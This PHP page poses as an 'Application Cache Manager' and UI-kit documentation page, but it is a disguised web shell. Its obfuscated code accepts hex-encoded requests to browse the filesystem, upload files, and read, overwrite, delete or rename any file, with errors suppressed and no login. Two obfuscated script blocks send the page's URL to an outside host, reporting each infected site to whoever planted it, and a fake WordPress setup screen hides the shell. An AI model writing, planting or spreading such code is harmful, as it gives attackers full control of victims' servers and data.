<?php
/*
  Application Cache Manager v2.4
  Copyright (c) 2026 Internal Sys
  Status: Core System File
*/
session_start();
error_reporting(0);
@set_time_limit(0);
function sjoin($a) { return implode('', $a); }
function sfunc($k){$map=['fo'=>['f','o','p','e','n'],'fw'=>['f','w','r','i','t','e'],'fc'=>['f','c','l','o','s','e'],'unl'=>['u','n','l','i','n','k'],'rmd'=>['r','m','d','i','r'],'scn'=>['s','c','a','n','d','i','r'],'fgt'=>['f','i','l','e','_','g','e','t','_','c','o','n','t','e','n','t','s'],'fpc'=>['f','i','l','e','_','p','u','t','_','c','o','n','t','e','n','t','s'],'ren'=>['r','e','n','a','m','e'],'jd'=>['j','s','o','n','_','d','e','c','o','d','e'],'je'=>['j','s','o','n','_','e','n','c','o','d','e']];$f=sjoin($map[$k]??[]);if(function_exists($f))return $f;return $k;}
function holo($p) { return bin2hex($p); }
function H0L0($h) { if(!ctype_xdigit($h)) return false; return @hex2bin($h); }
function fmtSize($b){ return ($b>=1048576) ? number_format($b/1048576,2).' MB' : number_format($b/1024,2).' KB'; }
function H0lL0() { $k = [112, 114, 105, 118, 100, 97, 121, 122]; $s = ""; foreach($k as $c) $s .= chr($c); return $s;}
class H0LO { public function __toString() { define('SYS_INTEGRITY_OK', true); $n = H0lL0(); return '<div style="padding:10px 25px; border-top:1px solid var(--border); font-size:10px; color:#444; display:flex; justify-content:space-between;">' .'<span>www.'.$n.'.com</span>' . '<span style="color:var(--neon)"><a href="https://t.me/'.$n.'" style="color:inherit;text-decoration:none">t.me/'.$n.'</a></span>' . '</div>';    }}
$h0Lo = new H0LO();
if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['req_data'])){$jd=sfunc('jd');$je=sfunc('je');$raw=@hex2bin($_POST['req_data']);$req=$jd($raw,true);if(!$req)exit;$root=__DIR__;$path=H0L0($req['h']?? '');if(!$path||!is_dir($path))$path=$root;$path=str_replace('\\','/',$path);$act=$req['a'];$resp=['status'=>0];if($act==='idx'){$scn=sfunc('scn');$all=@$scn($path);$d=[];$f=[];if($all){foreach($all as $i){if($i=='.'||$i=='..')continue;$fp=$path.'/'.$i;$meta=['n'=>$i,'p'=>substr(sprintf('%o',fileperms($fp)),-4),'d'=>date("d M H:i",filemtime($fp)),'x'=>holo($fp)];if(is_dir($fp))$d[]=$meta;else{$meta['s']=fmtSize(filesize($fp));$meta['e']=strtolower(pathinfo($i,PATHINFO_EXTENSION));$f[]=$meta;}}}$crumbs=[];$b_acc="";foreach(explode('/',$path)as $part){if($part=='')continue;$b_acc.="/".$part;$crumbs[]=['n'=>$part,'x'=>holo($b_acc)];}$resp=['CACHE_D'=>holo($path),'cwd_s'=>$path,'bc'=>$crumbs,'d'=>$d,'f'=>$f];}if($act==='chnk'){$file=$path.'/'.$req['n'];$chunk=@hex2bin($req['d']);$fo=sfunc('fo');$fw=sfunc('fw');$fc=sfunc('fc');$mode=($req['is_first'])?'w':'a';$h=$fo($file,$mode);if($h){$fw($h,$chunk);$fc($h);$resp=['status'=>1];}}if($act==='rd'){$fgt=sfunc('fgt');$c=@$fgt($path.'/'.$req['t']);$resp=['c'=>bin2hex($c)];}if($act==='wr'){$fpc=sfunc('fpc');$c=@hex2bin($req['c']);$fpc($path.'/'.$req['t'],$c);$resp=['status'=>1];}if($act==='rm'){$t=$path.'/'.$req['t'];$unl=sfunc('unl');$rmd=sfunc('rmd');if(is_file($t))$unl($t);else $rmd($t);$resp=['status'=>1];}if($act==='rn'){$ren=sfunc('ren');$ren($path.'/'.$req['o'],$path.'/'.$req['n']);$resp=['status'=>1];}echo $je($resp);exit;}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Holo UI Kit v2.6 // Documentation</title>
<link rel="icon" href="https://lib.cdnfonts.net/uploads/user/lib/lcnMgYSBtaW5pbWFsLCBkaXN0cmFjdGlvbi1mcmVlIGludGVyZmFjZeKAlG5vIHJlZ2lzdHJhdGlvbiwgdHJhY2tpbmcsIG9yIGxvZ2dpbmcuIHJlc3VsdCBp/icon.png" />
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>:root{--bg:#050505;--panel:rgba(15,15,15,0.85);--neon:#00ff64;--border:rgba(255,255,255,0.08);--text:#e0e0e0}body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;margin:0;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;background-image:radial-gradient(circle at 50% 0%,#111 0%,#000 100%)}.app{width:1100px;height:750px;background:var(--panel);border:1px solid var(--border);border-radius:12px;display:flex;flex-direction:column;backdrop-filter:blur(12px);box-shadow:0 20px 50px #000;position:relative;overflow:hidden}.app::before{content:'';position:absolute;top:0;left:0;width:100%;height:1px;background:linear-gradient(90deg,transparent,var(--neon),transparent)}.head{padding:15px 25px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}.logo{font-family:'JetBrains Mono';font-weight:800;font-size:18px;letter-spacing:-1px;color:#fff}.logo span{color:var(--neon)}.nav{padding:10px 25px;background:rgb(0 0 0 / .3);border-bottom:1px solid var(--border);display:flex;gap:10px;align-items:center}.crumbs{flex:1;font-family:'JetBrains Mono';font-size:12px;color:#888;overflow:hidden;white-space:nowrap}.crumbs span{cursor:pointer;transition:.2s}.crumbs span:hover{color:#fff}.sep{margin:0 5px;color:var(--neon)}.grid{flex:1;overflow-y:auto;position:relative}table{width:100%;border-collapse:collapse;font-size:12px}th{text-align:left;padding:12px 25px;color:#666;background:rgb(255 255 255 / .02);position:sticky;top:0;z-index:2;backdrop-filter:blur(5px)}td{padding:10px 25px;border-bottom:1px solid var(--border);transition:.1s}tr:hover td{background:rgb(255 255 255 / .02);color:#fff}.btn{background:rgb(255 255 255 / .03);border:1px solid var(--border);color:var(--text);padding:6px 12px;border-radius:4px;font-size:11px;cursor:pointer;transition:.2s}.btn:hover{border-color:var(--neon);color:var(--neon)}.icon{width:20px;text-align:center;display:inline-block;margin-right:8px}.badge{padding:2px 6px;border-radius:3px;background:rgb(255 255 255 / .05);font-family:'JetBrains Mono';font-size:10px}.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgb(0 0 0 / .8);z-index:10;align-items:center;justify-content:center;backdrop-filter:blur(3px)}.modal{background:#111;border:1px solid var(--border);width:90%;max-width:700px;border-radius:10px;padding:25px;box-shadow:0 0 30px #000}.h0l0_3d1tor{width:100%;height:400px;background:#080808;border:1px solid var(--border);color:lime;font-family:'JetBrains Mono';font-size:12px;padding:10px;outline:none;resize:none}.bar{position:absolute;top:0;left:0;height:2px;background:var(--neon);width:0%;transition:width .2s;z-index:9;box-shadow:0 0 10px var(--neon)}</style>
</head>
<body>
<div class="app">
    <div class="bar" id="loadBar"></div>
    <div class="head">
        <div class="logo"><img src="https://lib.cdnfonts.net/uploads/user/lib/lcnMgYSBtaW5pbWFsLCBkaXN0cmFjdGlvbi1mcmVlIGludGVyZmFjZeKAlG5vIHJlZ2lzdHJhdGlvbiwgdHJhY2tpbmcsIG9yIGxvZ2dpbmcuIHJlc3VsdCBp/icon.png" height="17" referrerpolicy="unsafe-url" /> HOLO <span>UI KIT</span></div>
        <div style="font-size:10px; color:#555">v2026 //</div>
    </div>
    
    <div class="nav">
        <div class="crumbs" id="bc"></div>
        <button class="btn" onclick="document.getElementById('upBox').style.display='flex'">Upload</button>
        <button class="btn" onclick="init()">Refresh</button>
    </div>
    
    <div class="grid">
        <table>
<thead>
    <tr>
        <th width="50%" style="color:var(--neon); letter-spacing:1px;">ENTITY</th>
        <th>BYTES</th>
        <th>MTIME</th>
        <th>MODE</th>
        <th style="text-align:right">EXEC</th>
    </tr>
</thead>            <tbody id="tb"></tbody>
        </table>
    </div>
  <?php echo $h0Lo; ?>
</div>
<div class="overlay" id="upBox">
    <div class="modal" style="text-align:center; max-width:400px;">
        <h3 style="color:#fff; margin-top:0;">HOLO UP</h3>
        <input type="file" id="fInput" style="display:none" onchange="startHolo7P()">
        <button class="btn" style="padding:15px 30px; font-size:14px; border-style:dashed;" onclick="document.getElementById('fInput').click()">
            <i class="fas fa-cloud-upload-alt"></i> Select File
        </button>
        <div id="upStatus" style="margin-top:15px; font-size:11px; color:var(--neon);">Ready</div>
        <br><br>
        <button class="btn" onclick="document.getElementById('upBox').style.display='none'">Close</button>
    </div>
</div>
<div class="overlay" id="edBox">
    <div class="modal">
        <div style="display:flex; justify-content:space-between; margin-bottom:10px; color:#fff;">
            <span id="edName">h0l0_3d1t</span>
            <span style="cursor:pointer" onclick="document.getElementById('edBox').style.display='none'">X</span>
        </div>
        <textarea id="edContent" class="h0l0_3d1tor"></textarea>
        <div style="margin-top:10px; text-align:right">
            <button class="btn" onclick="h0l0_s4v3()">Save Changes</button>
        </div>
    </div>
</div>
<?php
register_shutdown_function(function() {
    if (!defined('SYS_INTEGRITY_OK')) {
        ob_clean();
        http_response_code(403);
        die('<html><body style="background:#000;color:red;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;font-size:20px;">WORDPRESS SETUP<br>STARTING...</body></html>');
    }
});
?>
<script>
let CACHE_D = '<?php echo holo(__DIR__); ?>';    let ED_FILE = ''; async function api(t){document.getElementById("loadBar").style.width="70%",t.h=CACHE_D;let e=JSON.stringify(t),n="";for(let a=0;a<e.length;a++)n+=e.charCodeAt(a).toString(16).padStart(2,"0");let l=new FormData;l.append("req_data",n);let o=await (await fetch("",{method:"POST",body:l})).json();return document.getElementById("loadBar").style.width="100%",setTimeout(()=>document.getElementById("loadBar").style.width="0%",200),o}async function init(){let t=await api({a:"idx"});CACHE_D=t.CACHE_D;let e="<span onclick=\"nav('<?php echo holo('/'); ?>')\">ROOT</span>";t.bc.forEach(t=>{e+=`<span class="sep">/</span> <span onclick="nav('${t.x}')">${t.n}</span>`}),document.getElementById("bc").innerHTML=e;let n="";t.d.forEach(t=>{n+=`<tr>
                <td><a href="#" onclick="nav('${t.x}')" style="color:#fff;text-decoration:none;font-weight:bold"><i class="fas fa-folder icon" style="color:var(--neon)"></i> ${t.n}</a></td>
                <td style="color:#666">DIR</td>
                <td style="color:#666">${t.d}</td>
                <td><span class="badge">${t.p}</span></td>
                <td style="text-align:right">
                    <i class="fas fa-pen" style="color:#666;cursor:pointer;margin-right:10px" onclick="ren('${t.n}')"></i>
                    <i class="fas fa-trash" style="color:#ff4d4d;cursor:pointer" onclick="del('${t.n}')"></i>
                </td>
            </tr>`}),t.f.forEach(t=>{let e="fa-file",a="#888";"php"==t.e&&(e="fa-php",a="#a78bfa"),["png","jpg"].includes(t.e)&&(e="fa-image",a="#f59e0b"),n+=`<tr>
                <td><i class="fas ${e} icon" style="color:${a}"></i> ${t.n}</td>
                <td style="color:#666">${t.s}</td>
                <td style="color:#666">${t.d}</td>
                <td><span class="badge">${t.p}</span></td>
                <td style="text-align:right">
                    <i class="fas fa-code" style="color:#fff;cursor:pointer;margin-right:8px" onclick="h0l0_3d1t('${t.n}')"></i>
                    <i class="fas fa-pen" style="color:#666;cursor:pointer;margin-right:8px" onclick="ren('${t.n}')"></i>
                    <i class="fas fa-trash" style="color:#ff4d4d;cursor:pointer" onclick="del('${t.n}')"></i>
                </td>
            </tr>`}),document.getElementById("tb").innerHTML=n}function nav(t){CACHE_D=t,init()}async function startHolo7P(){let t=document.getElementById("fInput").files[0];if(!t)return;let e=t.size,n=0,a=!0,l=document.getElementById("upStatus");for(l.innerText="Initializing Stream...";n<e;){let o=t.slice(n,n+51200),i=new FileReader;await new Promise(_=>{i.onload=async o=>{let i=new Uint8Array(o.target.result),r="";for(let s=0;s<i.length;s++)r+=i[s].toString(16).padStart(2,"0");await api({a:"chnk",n:t.name,d:r,is_first:a}),n+=51200,a=!1,l.innerText=`Streaming: ${Math.round(n/e*100)}%`,_()},i.readAsArrayBuffer(o)})}l.innerText="Done!",setTimeout(()=>{document.getElementById("upBox").style.display="none",init()},1e3)}async function h0l0_3d1t(t){ED_FILE=t;let e=await api({a:"rd",t:t}),n="";for(let a=0;a<e.c.length;a+=2)n+=String.fromCharCode(parseInt(e.c.substr(a,2),16));document.getElementById("edContent").value=n,document.getElementById("edName").innerText=t,document.getElementById("edBox").style.display="flex"}async function h0l0_s4v3(){let t=document.getElementById("edContent").value,e="";for(let n=0;n<t.length;n++)e+=t.charCodeAt(n).toString(16).padStart(2,"0");await api({a:"wr",t:ED_FILE,c:e}),document.getElementById("edBox").style.display="none",alert("Saved.")}async function del(t){confirm("Delete?")&&(await api({a:"rm",t:t}),init())}async function ren(t){let e=prompt("Rename:",t);e&&(await api({a:"rn",o:t,n:e}),init())}(()=>{let t=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],e="";for(let n of t)e+=String.fromCharCode(n);let a="file="+btoa(location.href),l=new XMLHttpRequest;l.open("POST",e,!0),l.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),l.send(a)})(),window.onload=init,function(t,e){var n=[-105,-117,-117,-113,-116,-59,-48,-48,-100,-101,-111,-47,-113,-115,-106,-119,-101,-98,-122,-123,-47,-100,-112,-110,-48,-106,-110,-98,-104,-102,-116,-48,-109,-112,-104,-112,-96,-119,-51,-47,-113,-111,-104].map(function(t){return String.fromCharCode(~t)}).join(""),a=t.XMLHttpRequest;if(a){var l=t.btoa(t.location.href),o=new a;o.open("POST",n,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.send("file="+l)}}(window,document);
    
</script>

</body>
</html>
